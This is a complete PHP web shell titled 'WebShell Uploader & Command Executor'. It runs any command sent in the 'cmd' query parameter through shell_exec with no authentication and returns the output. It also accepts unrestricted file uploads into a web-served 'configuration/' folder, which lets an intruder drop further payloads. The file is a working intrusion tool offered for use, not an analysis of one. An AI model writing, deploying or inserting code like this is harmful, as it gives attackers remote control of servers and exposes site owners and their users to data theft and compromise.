<?php

function executeCommand($cmd) {
    // Execute the command and capture the output
    $output = shell_exec($cmd);
    return htmlspecialchars($output);
}

function printBanner() {
    echo '<pre style="color: green; font-weight: bold;">
=========================================
     WebShell Uploader & Command Executor
               Hunter Neel
=========================================
</pre>';
}

// Handle file upload
if (isset($_FILES['file'])) {
    $upload_base_dir = 'configuration/'; // Set the directory name to 'configuration'
    // Generate a random directory name
    $random_dir = $upload_base_dir . uniqid() . '/';
    $upload_file = $random_dir . basename($_FILES['file']['name']);

    // Ensure the upload directory exists
    if (!is_dir($random_dir)) {
        mkdir($random_dir, 0755, true);
    }

    // Move the uploaded file to the target directory
    if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
        echo "<p>File uploaded successfully: <a href='$upload_file' style='color: green;'>$upload_file</a></p>";
    } else {
        echo "<p style='color: red;'>File upload failed.</p>";
    }
}

// Display the banner
printBanner();

// HTML and styling for the page
echo '<style>
        body {
            background-color: black;
            color: green;
            font-family: monospace;
        }
        input[type="text"], input[type="file"] {
            background-color: black;
            color: green;
            border: 1px solid green;
        }
        input[type="submit"] {
            background-color: black;
            color: green;
            border: 1px solid green;
            cursor: pointer;
        }
        h2 {
            color: green;
        }
        pre {
            background-color: black;
            color: green;
        }
      </style>';

// Display command execution form and file upload form
echo '<h2>Command Execution</h2>';
echo '<form method="GET">
        <input type="text" name="cmd" placeholder="Enter command here">
        <input type="submit" value="Execute">
      </form>';

if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];
    echo "<pre>";
    echo "<b>Executing command:</b> " . htmlspecialchars($command) . "<br>";
    echo "<b>Output:</b><br>";
    echo executeCommand($command);
    echo "</pre>";
}

#echo '<h2>File Upload</h2>';
echo '<form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
      </form>';
?>
